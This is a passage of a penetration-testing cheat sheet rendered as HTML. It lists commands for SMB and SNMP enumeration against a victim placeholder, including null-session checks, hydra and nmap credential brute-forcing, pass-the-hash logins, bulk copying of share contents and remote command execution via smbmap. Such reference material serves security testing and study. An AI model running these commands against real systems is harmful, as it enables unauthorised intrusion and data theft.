$VICTIM_IP\n\n# recursively list directory contents\nsmbmap -R -H $VICTIM_IP\n\n# basic scan, enum4linux\nenum4linux $VICTIM_IP\n\n# scan all the things\nenum4linux -aMld $VICTIM_IP | tee enum4linux.log\n# try with guest user if getting nothing via null session:\nenum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log\n# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)\n\n# nmap script scans\nnmap --script=\u0026quot;safe and smb-*\u0026quot; -n -v -p 139,445 $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get netbios names of computers, and usernames\u003c/span\u003e\ncrackmapexec smb VICTIM_IP/24\nsudo nbtscan -r \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/24 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e force port 137, which Win95 hosts need to respond\u003c/span\u003e\nnbtscan \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/24\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check null sessions\u003c/span\u003e\ncrackmapexec smb VICTIM_IP/24 -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check guest login\u003c/span\u003e\ncrackmapexec smb VICTIM_IP/24 -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eguest\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerate hosts with SMB signing not required\u003c/span\u003e\ncrackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list shares\u003c/span\u003e\nsmbmap -H \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try with '-u guest' if getting \"[!] Authentication error\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try with '-u null -p null'\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list (only) windows version\u003c/span\u003e\nsmbmap -vH \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e recursively list directory contents\u003c/span\u003e\nsmbmap -R -H \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic scan, enum4linux\u003c/span\u003e\nenum4linux \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scan all the things\u003c/span\u003e\nenum4linux -aMld \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee enum4linux.log\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try with guest user if getting nothing via null session:\u003c/span\u003e\nenum4linux -u guest -aMld \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee enum4linux.log\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e nmap script scans\u003c/span\u003e\nnmap --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esafe and smb-*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -n -v -p 139,445 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eListing SMB Shares:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# enumerate readable/writable shares on multiple IPs with/without credentials\ncrackmapexec smb VICTIM_IPS -u USERNAME -p 'PASSWORD' --shares --filter-shares READ WRITE\n\n# list available shares using smbmap (no creds)\nsmbmap -H $VICTIM_IP\n\n# List shares using smbclient (no creds)\nsmbclient -N -L $VICTIM_IP\n\n# Enumerate shares you have creds for\n# Can provide password after '%' with smbclient;\n# will prompt for password if omitted.\nsmbclient -L $VICTIM_IP -W DOMAIN -U 'username[%password]'\n\n# Use  -c 'recurse;ls'  to list dirs recursively with smbclient\n# With --pw-nt-hash, the password is provided in NT hash form\nsmbclient -U 'username%NTHASH' --pw-nt-hash -c 'recurse;ls' //$VICTIM_IP\n\n# List with smbmap, without SHARENAME it lists everything\nsmbmap [-u \u0026quot;username\u0026quot; -p \u0026quot;password\u0026quot;] -R [SHARENAME] -H \u0026lt;IP\u0026gt; [-P \u0026lt;PORT\u0026gt;] # Recursive list\nsmbmap [-u \u0026quot;username\u0026quot; -p \u0026quot;password\u0026quot;] -r [SHARENAME] -H \u0026lt;IP\u0026gt; [-P \u0026lt;PORT\u0026gt;] # Non-Recursive list\nsmbmap -u \u0026quot;username\u0026quot; -p \u0026quot;\u0026lt;LM\u0026gt;:\u0026lt;NT\u0026gt;\u0026quot; [-r/-R] [SHARENAME] -H \u0026lt;IP\u0026gt; [-P \u0026lt;PORT\u0026gt;] # Pass-the-Hash\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerate readable/writable shares on multiple IPs with/without credentials\u003c/span\u003e\ncrackmapexec smb VICTIM_IPS -u USERNAME -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --shares --filter-shares READ WRITE\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list available shares using smbmap (no creds)\u003c/span\u003e\nsmbmap -H \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List shares using smbclient (no creds)\u003c/span\u003e\nsmbclient -N -L \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Enumerate shares you have creds for\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Can provide password after '%' with smbclient;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e will prompt for password if omitted.\u003c/span\u003e\nsmbclient -L \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -W DOMAIN -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eusername[%password]\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Use  -c 'recurse;ls'  to list dirs recursively with smbclient\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e With --pw-nt-hash, the password is provided in NT hash form\u003c/span\u003e\nsmbclient -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eusername%NTHASH\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --pw-nt-hash -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003erecurse;ls\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e //\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List with smbmap, without SHARENAME it lists everything\u003c/span\u003e\nsmbmap [-u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eusername\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-p\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epassword\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e] -R [SHARENAME] -H \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eIP\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e [-P \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ePORT\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e] \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Recursive list\u003c/span\u003e\nsmbmap [-u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eusername\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-p\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epassword\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e] -r [SHARENAME] -H \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eIP\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e [-P \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ePORT\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e] \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Non-Recursive list\u003c/span\u003e\nsmbmap -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eusername\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u0026lt;LM\u0026gt;:\u0026lt;NT\u0026gt;\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e [-r/-R] [SHARENAME] -H \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eIP\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e [-P \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ePORT\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e] \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Pass-the-Hash\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eListing SMB Shares from Windows:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# view shares on local host\nnet share\n\n# /all lets us see administrative shares (ending in '$').\n# Can use IP or hostname to specify host.\nnet view \\\\VICTIM /all\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view shares on local host\u003c/span\u003e\nnet share\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /all lets us see administrative shares (ending in '$').\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Can use IP or hostname to specify host.\u003c/span\u003e\nnet view \\\\VICTIM \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eall\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCommon shares for Windows:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eC$ - maps to C:/\u003c/li\u003e\n\u003cli\u003eADMIN$ - maps to C:/Windows\u003c/li\u003e\n\u003cli\u003eIPC$ - used for RPC\u003c/li\u003e\n\u003cli\u003ePrint$ - hosts drivers for shared printers\u003c/li\u003e\n\u003cli\u003eSYSVOL - only on DCs\u003c/li\u003e\n\u003cli\u003eNETLOGON - only on DCs\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e In recent versions of Kali, when connecting with \u003ccode\u003esmbclient\u003c/code\u003e, you might see an error message like:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eprotocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under \u003ccode\u003eGLOBAL\u003c/code\u003e in \u003ccode\u003e/etc/samba/smb.conf\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"client min protocol = CORE\nclient max protocol = SMB3\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eclient min protocol = CORE\nclient max protocol = SMB3\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOr you can add the flags \u003ccode\u003e-m SMB2\u003c/code\u003e or \u003ccode\u003e-m SMB3\u003c/code\u003e to your invocation of \u003ccode\u003esmbclient\u003c/code\u003e on the command line. However, this 2nd method does not apply to other tools like \u003ccode\u003eenum4linux\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.12.1 SMB Credential Bruteforcing\u003c/h3\u003e\u003ca id=\"user-content-2121-smb-credential-bruteforcing\" class=\"anchor\" aria-label=\"Permalink: 2.12.1 SMB Credential Bruteforcing\" href=\"#2121-smb-credential-bruteforcing\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"nmap --script smb-brute -p 445 $VICTIM_IP\nhydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb\"\u003e\u003cpre\u003enmap --script smb-brute -p 445 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nhydra -V -f -l Administrator -P passwords.txt -t 1 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e smb\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.12.2 Interacting with SMB\u003c/h3\u003e\u003ca id=\"user-content-2122-interacting-with-smb\" class=\"anchor\" aria-label=\"Permalink: 2.12.2 Interacting with SMB\" href=\"#2122-interacting-with-smb\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# tar all files [under a directory (no trailing slash on path)]\nsmbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]\n\n# recursively get all files (interactive session)\nsmbclient //$VICTIM_IP/SHARENAME\n\u0026gt; mask \u0026quot;\u0026quot; # don't filter any file names\n\u0026gt; recurse on # recursively execute commands\n\u0026gt; prompt off # don't prompt for file names\n\u0026gt; mget * # copy all files matching mask to host\n\n# Interactive smb shell with creds\nsmbclient '\\\\VICTIM_IP\\sharename' -W DOMAIN -U username[%password]\n# add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)\nsmbclient '\\\\VICTIM_IP\\sharename' -W DOMAIN -U username%NTHASH --pw-nt-hash\n\nsmb:\\\u0026gt; help  # displays commands to use\nsmb:\\\u0026gt; ls  # list files\nsmb:\\\u0026gt; get filename.txt  # fetch a file\n\n# mount smb share\nmount -t cifs -o \u0026quot;username=user,password=password\u0026quot; //x.x.x.x/share /mnt/share\n\n# try executing a command using wmi (can try psexec by adding '--mode psexec')\nsmbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e tar all files [under a directory (no trailing slash on path)]\u003c/span\u003e\nsmbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e recursively get all files (interactive session)\u003c/span\u003e\nsmbclient //\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/SHARENAME\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mask \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e don't filter any file names\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e recurse on \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e recursively execute commands\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e prompt off \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e don't prompt for file names\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mget \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e copy all files matching mask to host\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Interactive smb shell with creds\u003c/span\u003e\nsmbclient \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\\\VICTIM_IP\\sharename\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -W DOMAIN -U username[%password]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)\u003c/span\u003e\nsmbclient \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\\\VICTIM_IP\\sharename\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -W DOMAIN -U username%NTHASH --pw-nt-hash\n\nsmb:\u003cspan class=\"pl-cce\"\u003e\\\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ehelp\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e displays commands to use\u003c/span\u003e\nsmb:\u003cspan class=\"pl-cce\"\u003e\\\u0026gt;\u003c/span\u003e ls  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list files\u003c/span\u003e\nsmb:\u003cspan class=\"pl-cce\"\u003e\\\u0026gt;\u003c/span\u003e get filename.txt  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e fetch a file\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mount smb share\u003c/span\u003e\nmount -t cifs -o \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eusername=user,password=password\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e //x.x.x.x/share /mnt/share\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try executing a command using wmi (can try psexec by adding '--mode psexec')\u003c/span\u003e\nsmbmap -x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eipconfig\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -u USER -p PASSWORD\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.13 SNMP(s) - 161,162,10161,10162\u003c/h2\u003e\u003ca id=\"user-content-213-snmps---1611621016110162\" class=\"anchor\" aria-label=\"Permalink: 2.13 SNMP(s) - 161,162,10161,10162\" href=\"#213-snmps---1611621016110162\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSimple Network Management Protocol (SNMP), runs on UDP 161 and 162 (trap). The secure version (using TLS) is on 10161 and 10162.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBefore getting started, install the MIBs:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sudo apt install -y snmp snmp-mibs-downloader\nsudo download-mibs\"\u003e\u003cpre\u003esudo apt install -y snmp snmp-mibs-downloader\nsudo download-mibs\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor resolving further issues with MIBs, see \u003ca href=\"https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS\" rel=\"nofollow\"\u003eUsing and loading MIBs\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBasic SNMP enumeration:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# nmap snmp scan\nnmap --script \u0026quot;snmp* and not snmp-brute\u0026quot; $VICTIM_IP\n\n# quick bruteforce snmp community strings with onesixtyone\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100\n\n# extended bruteforce snmp community strings with hydra\nhydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp\n\n# comprehensive enumeration (system/network/process/software info)\nsnmp-check $VICTIM_IP\n\n# basic enumeration with onesixtyone, using default 'public' community string\nonesixtyone $VICTIM_IP public\n\n# getting system description (like uname -a on Linux systems)\nsnmpwalk -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr\nsnmpget -v2c -c public $VICTIM_IP SNMPv2-MIB::sysDescr.0\n\nsnmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users\nsnmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes\nsnmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports\nsnmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software\nsnmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software\n\n# get ALL info available on SNMP\nsnmpwalk -v2c -c public $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e nmap snmp scan\u003c/span\u003e\nnmap --script \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esnmp* and not snmp-brute\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e quick bruteforce snmp community strings with onesixtyone\u003c/span\u003e\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -w 100\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e extended bruteforce snmp community strings with hydra\u003c/span\u003e\nhydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e snmp\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e comprehensive enumeration (system/network/process/software info)\u003c/span\u003e\nsnmp-check \u003cspan 